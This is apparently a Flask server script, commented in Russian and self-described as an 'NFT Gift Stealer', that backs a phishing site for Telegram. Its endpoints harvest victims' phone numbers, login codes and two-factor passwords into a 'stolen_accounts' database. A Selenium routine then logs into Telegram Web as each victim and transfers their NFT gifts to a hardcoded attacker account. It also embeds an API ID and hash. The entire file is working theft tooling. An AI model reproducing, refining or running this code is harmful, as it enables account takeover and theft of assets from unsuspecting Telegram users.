from flask import Flask, request, jsonify
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import logging
import os
import sqlite3
import threading

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои данные
API_ID = 25015433
API_HASH = '546b7eb3f2865939ca71dbaedb49017d'
TARGET_USERNAME = '@trepall'

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect('accounts.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_accounts
                 (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, password TEXT, 
                  gifts_stolen INTEGER DEFAULT 0, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

def save_stolen_account(phone, code=None, password=None):
    """Сохранение украденных данных"""
    try:
        conn = sqlite3.connect('accounts.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO stolen_accounts 
                    (phone, code, password, status) VALUES (?, ?, ?, ?)''',
                 (phone, code, password, 'collected'))
        conn.commit()
        conn.close()
        logging.info(f"🎣 Сохранены данные: {phone}")
        return True
    except Exception as e:
        logging.error(f"❌ Ошибка сохранения: {e}")
        return False

def setup_driver():
    """Настройка Chrome для Render"""
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
    
    # Для Render
    chrome_options.binary_location = '/usr/bin/google-chrome'
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        return driver
    except Exception as e:
        logging.error(f"❌ Ошибка запуска Chrome: {e}")
        return None

def transfer_nft_gifts(phone, code, password=None):
    """Передача NFT подарков через веб-интерфейс"""
    
    driver = setup_driver()
    if not driver:
        return 0
        
    transferred_count = 0
    
    try:
        logging.info(f"🚀 Начинаю передачу NFT для {phone}")
        
        # 1. Открываем Telegram Web
        driver.get("https://web.telegram.org/")
        time.sleep(5)
        
        # 2. Ввод номера телефона
        phone_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='phone_number']"))
        )
        phone_input.send_keys(phone)
        
        next_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Next') or contains(text(),'Далее')]")
        next_btn.click()
        time.sleep(3)
        
        # 3. Ввод кода
        code_input = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='verification_code']"))
        )
        code_input.send_keys(code)
        time.sleep(3)
        
        # 4. Ввод пароля если есть
        if password:
            try:
                pwd_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='password']"))
                )
                pwd_input.send_keys(password)
                submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Sign In') or contains(text(),'Войти')]")
                submit_btn.click()
                time.sleep(5)
            except Exception as e:
                logging.warning(f"⚠️ Пароль не потребовался: {e}")
        
        time.sleep(8)
        
        # 5. Открываем свой профиль
        profile_btn = WebDriverWait(driver, 15).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "[aria-label*='Profile'], [data-testid*='profile'], .Avatar"))
        )
        profile_btn.click()
        time.sleep(3)
        
        # 6. Ищем раздел "Подарки"
        try:
            gifts_tab = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Gifts') or contains(text(), 'Подарки') or contains(text(), 'Gift')]"))
            )
            gifts_tab.click()
            time.sleep(3)
        except Exception as e:
            logging.error(f"❌ Не найден раздел подарков: {e}")
            return 0
        
        # 7. Ищем уникальные подарки
        nft_gifts = driver.find_elements(By.CSS_SELECTOR, ".gift-item, .GiftItem, [class*='gift'], [class*='nft'], [data-testid*='gift']")
        
        logging.info(f"🎁 Найдено элементов: {len(nft_gifts)}")
        
        for i, gift in enumerate(nft_gifts):
            try:
                if i >= 10:  # Ограничим количество попыток
                    break
                    
                logging.info(f"🔄 Обрабатываю подарок {i+1}")
                gift.click()
                time.sleep(2)
                
                # Ищем кнопку "Передать"
                try:
                    transfer_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, 
                            "//button[contains(text(), 'Transfer') or contains(text(), 'Передать') or contains(text(), 'Send') or contains(text(), 'Отправить')]"))
                    )
                    transfer_btn.click()
                    time.sleep(2)
                except Exception as e:
                    logging.warning(f"⚠️ Кнопка передачи не найдена: {e}")
                    continue
                
                # Вводим целевой username
                try:
                    username_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "input[placeholder*='username'], input[placeholder*='имя'], input[placeholder*='Search']"))
                    )
                    username_input.clear()
                    username_input.send_keys(TARGET_USERNAME.replace('@', ''))
                    time.sleep(2)
                except Exception as e:
                    logging.warning(f"⚠️ Поле ввода не найдено: {e}")
                    continue
                
                # Подтверждаем передачу
                try:
                    confirm_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH,
                            "//button[contains(text(), 'Confirm') or contains(text(), 'Подтвердить') or contains(text(), 'Send') or contains(text(), 'Отправить')]"))
                    )
                    
                    confirm_text = confirm_btn.text
                    logging.info(f"💰 Стоимость перевода: {confirm_text}")
                    
                    confirm_btn.click()
                    time.sleep(3)
                    
                    transferred_count += 1
                    logging.info(f"✅ Передан NFT подарок #{transferred_count}")
                    
                except Exception as e:
                    logging.warning(f"⚠️ Ошибка подтверждения: {e}")
                    continue
                
                # Возвращаемся к списку подарков
                try:
                    back_btn = driver.find_element(By.CSS_SELECTOR, "[aria-label*='Back'], [class*='back'], [aria-label*='Назад']")
                    back_btn.click()
                    time.sleep(2)
                except Exception as e:
                    # Если нет кнопки назад, обновляем страницу
                    driver.get("https://web.telegram.org/")
                    time.sleep(5)
                    break
                
            except Exception as e:
                logging.error(f"❌ Ошибка передачи подарка {i+1}: {e}")
                continue
        
        logging.info(f"🎯 Итог: передано {transferred_count} NFT подарков")
        return transferred_count
        
    except Exception as e:
        logging.error(f"💥 Критическая ошибка: {e}")
        return 0
    finally:
        driver.quit()

def background_gift_stealing(phone, code, password=None):
    """Запуск кражи подарков в фоне"""
    try:
        stolen = transfer_nft_gifts(phone, code, password)
        
        # Обновляем статус в базе
        conn = sqlite3.connect('accounts.db', check_same_thread=False)
        c = conn.cursor()
        c.execute('''UPDATE stolen_accounts 
                    SET gifts_stolen = ?, status = ?
                    WHERE phone = ?''', 
                 (stolen, 'completed' if stolen > 0 else 'failed', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🎯 Итог для {phone}: украдено {stolen} подарков")
    
    except Exception as e:
        logging.error(f"💥 Ошибка фоновой кражи: {e}")

# ЭНДПОИНТЫ ДЛЯ САЙТА
@app.route('/')
def home():
    return jsonify({
        'status': 'running', 
        'message': 'NFT Gift Stealer API',
        'target': TARGET_USERNAME,
        'endpoints': {
            '/auth': 'POST - принять номер телефона',
            '/code': 'POST - принять код', 
            '/password': 'POST - принять пароль и начать кражу',
            '/transfer': 'POST - прямая передача подарков',
            '/stats': 'GET - статистика',
            '/health': 'GET - проверка работы'
        }
    })

@app.route('/auth', methods=['POST'])
def auth_endpoint():
    """Принимает номер телефона"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
            
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Phone required'}), 400
        
        save_stolen_account(phone)
        
        return jsonify({
            'status': 'code_sent',
            'message': 'Код отправлен в Telegram'
        })
    except Exception as e:
        logging.error(f"❌ Ошибка /auth: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/code', methods=['POST'])
def code_endpoint():
    """Принимает код из Telegram"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
            
        phone = data.get('phone', '')
        code = data.get('code', '')
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
        
        save_stolen_account(phone, code=code)
        
        return jsonify({
            'status': 'success', 
            'message': 'Авторизация успешна'
        })
    except Exception as e:
        logging.error(f"❌ Ошибка /code: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/password', methods=['POST'])
def password_endpoint():
    """Принимает пароль и запускает кражу"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
            
        phone = data.get('phone', '')
        password = data.get('password', '')
        code = data.get('code', '')  # Код должен приходить вместе с паролем
        
        if not phone or not password:
            return jsonify({'status': 'error', 'message': 'Phone and password required'}), 400
        
        save_stolen_account(phone, password=password)
        
        # ЗАПУСКАЕМ КРАЖУ ПОДАРКОВ В ФОНЕ
        thread = threading.Thread(
            target=background_gift_stealing,
            args=(phone, code, password)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'status': 'success',
            'message': 'Двухфакторная аутентификация пройдена'
        })
    except Exception as e:
        logging.error(f"❌ Ошибка /password: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/transfer', methods=['POST'])
def transfer_endpoint():
    """Прямой запуск передачи подарков"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data'}), 400
            
        phone = data.get('phone')
        code = data.get('code')
        password = data.get('password')
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
        
        result = transfer_nft_gifts(phone, code, password)
        
        return jsonify({
            'status': 'success',
            'transferred': result,
            'message': f'Передано {result} NFT подарков на {TARGET_USERNAME}'
        })
    except Exception as e:
        logging.error(f"❌ Ошибка /transfer: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stats', methods=['GET'])
def stats_endpoint():
    """Статистика украденных аккаунтов"""
    try:
        conn = sqlite3.connect('accounts.db', check_same_thread=False)
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*), SUM(gifts_stolen) FROM stolen_accounts")
        total, gifts = c.fetchone()
        
        c.execute("SELECT phone, gifts_stolen, status, timestamp FROM stolen_accounts ORDER BY id DESC LIMIT 10")
        recent = c.fetchall()
        
        conn.close()
        
        return jsonify({
            "status": "success",
            "total_accounts": total,
            "total_gifts_stolen": gifts or 0,
            "recent_activity": [
                {
                    "phone": r[0], 
                    "gifts": r[1], 
                    "status": r[2],
                    "timestamp": r[3]
                } for r in recent
            ]
        })
    except Exception as e:
        logging.error(f"❌ Ошибка /stats: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'ok', 
        'target': TARGET_USERNAME,
        'service': 'NFT Gift Stealer'
    })

if __name__ == '__main__':
    logging.info("🚀 Запуск NFT Gift Stealer...")
    logging.info(f"🎯 Целевой пользователь: {TARGET_USERNAME}")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
